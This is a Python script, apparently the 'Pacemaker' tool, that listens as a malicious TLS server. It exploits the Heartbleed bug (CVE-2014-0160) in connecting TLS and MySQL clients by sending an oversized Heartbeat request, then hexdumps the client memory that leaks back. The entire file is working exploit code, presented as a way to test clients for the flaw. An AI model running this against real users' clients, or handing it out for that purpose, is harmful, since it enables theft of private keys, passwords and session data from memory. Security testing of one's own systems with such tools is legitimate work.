#!/usr/bin/env python
# Exploitation of CVE-2014-0160 Heartbeat for the client
# Author: Peter Wu <peter@lekensteyn.nl>

try:
    import socketserver
except:
    import SocketServer as socketserver
import socket
import sys
import struct
import select, time
from argparse import ArgumentParser

parser = ArgumentParser(description='Test clients for Heartbleed (CVE-2014-0160)')
parser.add_argument('-l', '--listen', default='',
        help='Host to listen on (default "%(default)s")')
parser.add_argument('-p', '--port', type=int, default=4433,
        help='TCP port to listen on (default %(default)d)')
parser.add_argument('-c', '--client', default='tls',
        choices=['tls', 'mysql'],
        help='Target client type (default %(default)s)')
parser.add_argument('-t', '--timeout', type=int, default=3,
        help='Timeout in seconds to wait for a Heartbeat (default %(default)d)')
parser.add_argument('--skip-server', default=False, action='store_true',
        help='Skip ServerHello, immediately write Heartbeat request')
parser.add_argument('-x', '--count', type=int, default=1,
        help='Number of Hearbeats requests to be sent (default %(default)d)')

def make_hello(sslver, cipher):
    # Record
    data = '16 ' + sslver
    data += ' 00 31' # Record ength
    # Handshake
    data += ' 02 00'
    data += ' 00 2d' # Handshake length
    data += ' ' + sslver
    data += '''
    52 34 c6 6d 86 8d e8 40 97 da
    ee 7e 21 c4 1d 2e 9f e9 60 5f 05 b0 ce af 7e b7
    95 8c 33 42 3f d5 00
    '''
    data += ' '.join('{:02x}'.format(c) for c in cipher)
    data += ' 00' # No compression
    data += ' 00 05' # Extensions length
    # Heartbeat extension
    data += ' 00 0f' # Heartbeat type
    data += ' 00 01' # Length
    data += ' 01'    # mode
    return bytearray.fromhex(data.replace('\n', ''))

def make_heartbeat(sslver):
    data = '18 ' + sslver
    data += ' 00 03'    # Length
    data += ' 01'       # Type: Request
    data += ' ff ff'    # Payload Length
    return bytearray.fromhex(data.replace('\n', ''))

def hexdump(data):
    allzeroes = b'\0' * 16
    zerolines = 0

    for i in range(0, len(data), 16):
        line = data[i:i+16]
        if line == allzeroes:
            zerolines += 1
            if zerolines == 2:
                print("*")
            if zerolines >= 2:
                continue

        print("{:04x}: {:47}  {}".format(i,
            ' '.join('{:02x}'.format(c) for c in line),
            ''.join(chr(c) if c >= 32 and c < 127 else '.' for c in line)))

class Failure(Exception):
    pass

class RequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        self.args = self.server.args
        self.sslver = '03 01' # default to TLSv1.0
        remote_addr, remote_port = self.request.getpeername()
        print("Connection from: {}:{}".format(remote_addr, remote_port))

        try:
            # Set timeout to prevent hang on clients that send nothing
            self.request.settimeout(2)
            prep_meth = 'prepare_' + self.args.client
            if hasattr(self, prep_meth):
                getattr(self, prep_meth)(self.request)
                print('Pre-TLS stage completed, continuing with handshake')

            if not self.args.skip_server:
                self.do_serverhello()

            for i in range(0, self.args.count):
                self.do_evil()
        except (Failure, socket.timeout) as e:
            print('Unable to check for vulnerability: ' + str(e))

        print('')

    def do_serverhello(self):
        # Read TLS record header
        content_type, ver, rec_len = self.recv_s('>BHH', 'TLS record')
        self.expect(content_type == 22, 'Expected Handshake type')
        # Session-ID length (1 byte) starts at offset 38
        self.expect(rec_len >= 39, 'Illegal handshake packet')

        # Read handshake
        hnd = self.request.recv(rec_len)
        self.expect(len(hnd) == rec_len, 'Unable to read handshake')
        hnd_type, len_high, len_low, ver = struct.unpack('>BBHH', hnd[:6])
        self.expect(hnd_type == 1, 'Expected Client Hello')
        # hnd[6:6+32] is Random
        off = 6 + 32
        sid_len, = struct.unpack('B', hnd[off:off+1])
        off += 1 + sid_len # Skip length and SID
        # Enough room for ciphers?
        self.expect(rec_len - off >= 4, 'Illegal handshake packet (2)')
        ciphers_len = struct.unpack("<H", hnd[off:off+2])
        off += 2
        # The first cipher is fine...
        cipher = bytearray(hnd[off:off+2])

        self.sslver = '{:02x} {:02x}'.format(ver >> 8, ver & 0xFF)

        # (1) Handshake: ServerHello
        self.request.sendall(make_hello(self.sslver, cipher))

        # (skip Certificate, etc.)

    def do_evil(self):
        # (2) HeartbeatRequest
        self.request.sendall(make_heartbeat(self.sslver))

        # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
        if not self.read_memory(self.request, self.args.timeout):
            print("Possibly not vulnerable")

    def read_memory(self, sock, timeout):
        end_time = time.time() + timeout
        buffer = bytearray()
        wanted_bytes = 0xffff

        while wanted_bytes > 0 and timeout > 0:
            rl, _, _ = select.select([sock], [], [], timeout)

            if not rl:
                break

            data = rl[0].recv(wanted_bytes)
            if not data: # EOF
                break
            buffer += data
            wanted_bytes -= len(data)
            timeout = end_time - time.time()

        if len(buffer) > 0:
            print('Client returned {0} ({0:#x}) bytes'.format(len(buffer)))
            hexdump(buffer)
        return len(buffer) > 0

    def expect(self, cond, what):
        if not cond:
            raise Failure(what)


    def prepare_mysql(self, sock):
        # This was taken from a MariaDB client. For reference, see
        # https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake
        greeting = '''
        56 00 00 00 0a 35 2e 35  2e 33 36 2d 4d 61 72 69
        61 44 42 2d 6c 6f 67 00  04 00 00 00 3d 3b 4e 57
        4c 54 44 35 00 ff ff 21  02 00 0f e0 15 00 00 00
        00 00 00 00 00 00 00 7c  36 33 3f 23 2e 5e 6d 2d
        34 5c 54 00 6d 79 73 71  6c 5f 6e 61 74 69 76 65
        5f 70 61 73 73 77 6f 72  64 00
        '''
        sock.sendall(bytearray.fromhex(greeting.replace('\n', '')))
        print("Server Greeting sent.")

        len_low, len_high, seqid, caps = self.recv_s('<BHBH', 'MySQL handshake')
        packet_len = (len_high << 8) | len_low
        self.expect(packet_len == 32, 'Expected SSLRequest length == 32')
        self.expect((caps & 0x800), 'Missing Client SSL support')

        print("Skipping {} packet bytes...".format(packet_len))
        # Skip remainder (minus 2 for caps) to prepare for SSL handshake
        sock.recv(packet_len - 2)

    def recv_s(self, struct_def, what):
        s = struct.Struct(struct_def)
        data = self.request.recv(s.size)
        msg = '{}: received only {}/{} bytes'.format(what, len(data), s.size)
        self.expect(len(data) == s.size, msg)
        return s.unpack(data)

class PacemakerServer(socketserver.TCPServer):
    def __init__(self, args):
        server_address = (args.listen, args.port)
        self.allow_reuse_address = True
        socketserver.TCPServer.__init__(self, server_address, RequestHandler)
        self.args = args

def serve(args):
    print('Listening on {}:{} for {} clients'
        .format(args.listen, args.port, args.client))
    server = PacemakerServer(args)
    server.serve_forever()

if __name__ == '__main__':
    args = parser.parse_args()
    serve(args)
